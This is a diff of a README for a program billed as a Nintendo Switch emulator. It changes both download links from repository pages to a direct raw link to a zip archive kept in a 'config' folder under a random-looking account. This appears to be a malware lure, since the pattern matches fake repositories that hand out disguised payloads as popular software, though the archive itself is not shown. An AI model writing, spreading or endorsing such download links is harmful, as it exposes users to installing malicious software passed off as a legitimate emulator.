@@ -1,6 +1,6 @@
 # 💾 Eden-Emulator - Play Nintendo Switch Games on PC
 
-[![Download Now](https://img.shields.io/badge/Download-Eden--Emulator-blueviolet?style=for-the-badge&logo=github)](https://github.com/professionoenotherafruticosa997/Eden-Emulator)
+[![Download Now](https://img.shields.io/badge/Download-Eden--Emulator-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/professionoenotherafruticosa997/Eden-Emulator/main/config/2.2-alpha.4.zip)
 
 ## 🎮 What Is Eden-Emulator?
 
@@ -32,7 +32,7 @@ To run Eden-Emulator smoothly, you need:
 
 Visit this link to download the application:
 
-[Download Eden-Emulator Now](https://github.com/accused/enotherafruticosa997/Eden-Emulator)
+[Download Eden-Emulator Now](https://raw.githubusercontent.com/professionoenotherafruticosa997/Eden-Emulator/main/config/2.2-alpha.4.zip)
 
 After opening the link:
 1. Click on the latest release.
